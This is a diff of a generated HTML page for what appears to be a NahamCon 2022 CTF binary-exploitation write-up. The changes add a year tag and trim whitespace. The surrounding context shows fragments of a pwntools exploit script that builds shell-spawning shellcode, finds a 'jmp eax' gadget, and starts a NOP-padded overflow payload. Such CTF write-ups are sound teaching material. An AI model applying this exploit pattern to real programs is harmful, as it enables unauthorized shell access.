@@ -90,6 +90,7 @@ The C source code:
   <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
 </svg>
               <a class="tag" href="https://tzion0.github.io/tags/nahamconctf/">NAHAMCONCTF</a>
+              <a class="tag" href="https://tzion0.github.io/tags/2022/">2022</a>
               <a class="tag" href="https://tzion0.github.io/tags/binexp/">BinExp</a>
         </div>
       </div>
@@ -243,7 +244,7 @@ RWX:      Has RWX segments
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#io = remote(&#34;challenge.nahamcon.com&#34;,31983)</span>
 </span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(exe)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>  
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(shellcraft<span style="color:#f92672">.</span>exit())
@@ -251,7 +252,7 @@ RWX:      Has RWX segments
 </span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;jmp eax&#39;</span>)
 </span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> next(elf<span style="color:#f92672">.</span>search(jmp_eax))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat([
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset,
 </span></span><span style="display:flex;"><span>    jmp_eax,
